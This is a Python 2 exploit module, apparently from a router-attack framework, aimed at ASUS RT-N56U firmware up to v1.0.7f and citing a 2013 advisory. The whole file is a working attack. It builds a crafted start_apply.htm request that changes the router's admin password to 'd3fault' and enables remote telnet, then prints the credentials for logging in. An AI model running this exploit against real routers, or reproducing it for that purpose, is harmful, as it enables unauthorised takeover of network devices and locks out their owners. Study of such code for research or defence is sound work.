import urllib
import util
from ..router_vuln import RouterVuln

__router__='RT-N56U <= v1.0.7f'
__vuln__='Change Admin Password'
class ChangeAdmin(RouterVuln):
	"""Change the admin password and enable the remote telnet server
	   http://forelsec.blogspot.com/2013/02/asus-rt56u-multiple-vulnerabilities.html
	"""
	def __init__(self):
		super(ChangeAdmin,self).__init__()

	def run(self):
		util.Msg('Changing admin password and enabling remote telnet server...')
		try:
			url = 'http://%s/start_apply.htm?productid=RT-N56U&current_page=Advanced_System_Content.asp' \
				  '&next_page=&next_host=&sid_list=LANHostConfig%3BGeneral%3B&group_id=&modified=0' \
				  '&action_mode=+Apply+&first_time=&action_script=&preferred_lang=EN&wl_ssid2=wat'\
				  '&firmver=1.0.7f&http_passwd=d3fault&http_passwd2=d3fault&v_password2=d3fault' \
				  '&log_ipaddr=&time_zone=UCT12&ntp_server0=pool.ntp.org&telnetd=1'%self.ip
			response = urllib.urlopen(url).read()
			util.Msg('Done.  telnet into %s with \'admin:d3fault\''%self.ip)
		except Exception,e:
			util.Error('Error: %s'%e)
